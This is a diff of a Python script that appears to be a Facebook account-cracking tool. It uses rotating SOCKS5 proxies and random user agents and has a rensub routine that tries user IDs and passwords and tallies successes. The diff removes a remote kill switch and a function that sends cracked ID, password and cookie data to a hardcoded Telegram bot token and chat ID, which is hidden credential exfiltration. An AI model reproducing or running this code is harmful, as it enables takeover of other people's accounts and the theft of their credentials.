@@ -5,38 +5,11 @@ import os,json,time,uuid,sys,random,base64,shutil,re,requests,rich,gtts
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 
 from datetime import datetime
-month={"01":"January","02":"February","03":"March","04":"April","05":"May","06":"June","07":"July","08":"August","09":"September","10":"October","11":"November","12":"December",}
-today_data=str(datetime.now()).split(" ")[0].split("-")
-today=today_data[2]+"~"+month.get(today_data[1])
-
-
 
 try:
     rx=requests.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text.splitlines()
 except:
     sys.exit(" Internet Error ")
-#━━━━━━━━[ BYPASS USER ]━━━━━━━━#
-try:
-    os.system('clear')
-    srv=requests.get('https://raw.githubusercontent.com/Xiyad404/SEX/main/FUK.txt').text 
-    if "update" in srv:
-        os.system('clear')
-        for j in range(20):
-            time.sleep(0.5)
-            #os.system('xdg-open https://github.com/SEFAT-MAHADI')
-            print(f'\033[1;92m Tool Is Updating')
-        exit()
-    elif "off" in srv:
-        os.system('clear')
-        for j in range(20):
-            time.sleep(0.5)
-            #os.system('xdg-open https://github.com/MAHADI-143')
-            print(f'\033[1;91m Tool is Currenty Off')
-        exit()
-except requests.exceptions.ConnectionError:
-    print(f"\033[1;91m Connection Problem, Please Check Your Internet And Run Again")
-    sys.exit()
- #━━━━━━━━[ CLOUR CODE ]━━━━━━━━#
 
  #━━━━━━━━[ CLOUR CODE ]━━━━━━━━#
 
@@ -78,15 +51,10 @@ for d in range(10000):
 	uaku2 = random.choice([delta1,delta2,delta3,delta4,delta5])
 	ugenxxx.append(uaku2)
 
-
-
-
-
 try:
     rx=requests.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text.splitlines()
 except:
     sys.exit(" Internet Error ")
-
 
 os.system('clear')
 logo =f"""\033[1;37m
@@ -114,8 +82,7 @@ def cler():
 
 def osjoin():
     os.system("clear")
-
-
+	
 def menu():
     cler()
     print(f"({G}1{W}) RANDOM")
@@ -208,8 +175,6 @@ def uoa():
     ver2=str(random.choice(range(57,77)))
     return f"Mozilla/5.0 (Linux; Linux x86_64) AppleWebKit/537.30 (KHTML, like Gecko) Chrome/{ver}.0.3760.{ver2} Safari/535"
 
-
-
 def rensub(uid,pwx,meth,fb,user):
     global oks,cps,loop
     ua = random.choice(ugenxxx)
@@ -283,19 +248,4 @@ def rensub(uid,pwx,meth,fb,user):
     except Exception as e:
         
         time.sleep(15)
-
-
-def xxxx(idf,ps,coki):
-    try:
-        import requests
-        token = "6570882722:AAGMFeK9e9PdLWxxO6TPJKnZd2jmWbQkv1I"#Add your token 
-        chatid = "6692403694"#Add your Chat Id
-        OK=str(idf+"|"+ps+"|"+coki)
-        url = f"https://api.telegram.org/bot{token}/sendMessage"
-        params = {"chat_id": chatid, "text": OK}
-        requests.get(url, params=params)
-    except:
-        pass
-
-
 menu()
